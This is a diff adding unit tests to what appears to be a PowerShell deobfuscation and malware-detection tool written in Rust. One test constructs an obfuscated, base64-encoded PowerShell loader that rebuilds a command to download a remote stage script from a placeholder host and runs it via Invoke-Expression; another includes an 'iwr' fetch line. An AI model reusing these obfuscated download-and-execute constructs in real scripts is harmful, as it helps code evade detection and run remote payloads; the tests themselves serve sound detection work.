@@ -15894,6 +15894,47 @@ function Clean($value,$chars) {{
     }
 
     #[test]
+    fn ps1_literal_index_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}' 1)"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-index-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value,$index) {{
+  return $value[$index]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-index-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_new_item_function_path_name_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
@@ -24851,6 +24892,23 @@ mod ps_alias_tests {
         assert!(
             out.contains("Write-Output $line"),
             "echo alias missed: {}",
+            out
+        );
+    }
+
+    #[test]
+    fn quoted_literals_are_not_expanded_as_aliases() {
+        let input = "$cmd = ('h') + ('iwr') + \"curl\"; iwr http://e.example/p";
+        let out = expand_aliases(input);
+
+        assert!(
+            out.contains("('h') + ('iwr') + \"curl\""),
+            "alias expansion rewrote quoted literal text: {}",
+            out
+        );
+        assert!(
+            out.contains("Invoke-WebRequest http://e.example/p"),
+            "command-position alias was not expanded: {}",
             out
         );
     }
